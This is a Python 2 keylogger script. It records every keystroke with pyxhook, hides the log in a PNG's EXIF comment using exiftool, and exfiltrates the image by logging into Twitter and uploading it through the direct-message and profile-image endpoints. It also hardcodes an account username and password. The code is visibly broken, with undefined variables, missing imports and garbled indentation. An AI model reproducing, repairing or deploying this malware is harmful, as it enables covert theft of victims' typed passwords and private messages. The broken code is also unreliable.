# -*- coding: utf-8 -*-
# keylogger_exif.py 
from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import requests
import pyxhook

SESSION = requests.Session()
RESPONSE = ""
AUTH_TOKEN = ""
PATH = "../images/IMG_0005.PNG"
FILESIZE = ""
USERNAME = "ShuntoMizushima"
PASSWORD = "mizushima4105"

class KeyLogSender:
    def __init__(self):
        ip = 'localhost'
        port = 9050
        #socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, ip, port)
        #socket.socket = socks.socksocket
        self.host_url = "https://twitter.com/"
        self.session_url = self.host_url + "sessions"
        self.dm_url = self.host_url + "i/direct_messages/new"
    
    def login(self):
        global SESSION, RESPONSE, AUTH_TOKEN

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://twitter.com/",
            "Origin": "https://twitter.com",
            "Upgrade-insecure-requests": "1"
        }
                                                                                                                       
        login = {
            "session[username_or_email]": "",
            "sesssion[password]": "",
            "remember_me": "1",
            "return_to_ssl": "",
            "redirect_after_login": "/",
            "scribe_log": "",
            "authenticity_token":""
        }
        
        try: 
            response = SESSION.get(self.host_url, headers=headers, allow_redirects=False)
            soup = BeautifulSoup(response.text, "lxml")
            AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
        except ConnectionError:
            print "[*] Can't connect to Twitter."
            sys.exit()
                                                                                                                       
        login['authenticity_token'] = AUTH_TOKEN
                                                                                                                       
        try:
            login = SESSION.post(session_url, headers=headers, data=payload, allow_redirects=False)
            if login.status_code == 302 or login.status_code == 200:
                print "[+] Loggined successfully, HTTP Status Code: %d" % login.status_code
            else:
                print "[+] Failed to loggin, HTTP Status Code: %d" % login.status_code
            
        except:
            "[+] An error occurred in the middle of the login."

    def dm_send(self, message):
        global SESSION, RESPONSE, AUTH_TOKEN

        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ja,en-US;q=0.7,en;q=0.3",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://twitter.com/",
            "Origin": "https://twitter.com",
            "Upgrade-Insecure-Requests": "1",
            "X-Requested-With":"smLHttpRequest"
        }
       
       imageheaders = {
           "User-Agent":"Mozilla/5.0",
           "Accept":"*/*", 
           "Accept-Language": "gzip, deflate, br",
           "Referer": "https://twitter.com/",
           "Origin": "https://twitter.com",
           "Authority":"upload.twitter.com",
           "Content-Length":"117291"
       }
       
       
       
        
        send = {
            "authenticity_token":AUTH_TOKEN,
            "conversation_id":"796359178117750785-796359178117750785",
            "media_data[fileId]":"2",
            "media_data[fileType]":"image",
            "media_data[mediaCategory]":"dm_image",
            "media_data[uploadId]":"2",
            "media_data[mediaType]":"image/png",
            "media_id":"",
            "scribeContect[component]":"tweet_box_dm",
            "tagged_users":"",
            "text":message,
            "tweetboxId":"swift_tweetbox_1501901524731"
        } 
        try:
            cmd = 'exiftool "-comment<=keylog.txt" ' + PATH + ' > /dev/null'
            os.system(cmd)
            FILESIZE = str(os.path.getsize(PATH))  
        except:
            print "[+] Failed to write the payload to the comment section of the exif."
        imageids = SESSION.post("https://upload.twitter.com/i/media/upload.json?command=INIT&total_bytes=" + str(os.path.getsize(PATH)) + "&media_type=image%2Fpng&media_category=dm_image", headers=headers, cookies=RESPONSE.cookies)
                                                                                                                                                                                                                                           
        imageids = imageids.json()
        imageid = imageids['media_id']
        send['media_id'] = str(imageid)
        send['authenticity_token'] = AUTH_TOKEN
        files = {'media':open(PATH, 'rb')}
        
                                                                                                                                                                                                                                           
        RESPONES = SESSION.post("https://upload.twitter.com/i/media/upload.json?command=APPEND&media_id=" + str(imageid) + "&segment_index=0", files=files, headers=imageheaders, cookie=RESPONSE.cookies)
                                                                                                                                                                                                                                           
        RESPONSE = SESSION.post("https://twitter.com/i/profiles/updata_profile_image", data=image, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
                                                                                                                                                                                  if RESPONSE.status_code == 200:
                                                                                                                                                                                      print "[+] Completed sending the injected exif file, HTTP Status Code: $d" % RESPONSE.status_code
                                                                                                                                                                                  else:
                                                                                                                                                                                      print "[+] Failed to send the injected exif file, HTTP Status Code: %d" % RESPONSE.status_code
                                                                                                                                                                                      print RESPONSE.text
                                                                                                                                                                                      self.login()
                                                                                                                                                                                except:
                                                                                                                                                                                    print "[+] An error occurred while sending the injected exif file."
                                                                                                                                                                                    self.login()
                                                                                                                                                        def OnKeyPress(event):

    try:
        file = open("keylog.txt", 'af+')
        file.write(event.Key)
        file.write('\n')
        logsize = int(os.path.getsize("keylog.txt"))
        if int("300") < int(longsize):
            KeyLogSender.dm_send()
            new_hook.cancel()
        file.close()
    except:
        print "[+] An error occurred while sending the key information."

if __name__ == "__main__":
    KeyLogSender = KeyLogSender()
    KeyLogSender.login()
    
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress    
    new_hook.HookKeyboard()
    new_hook.start()
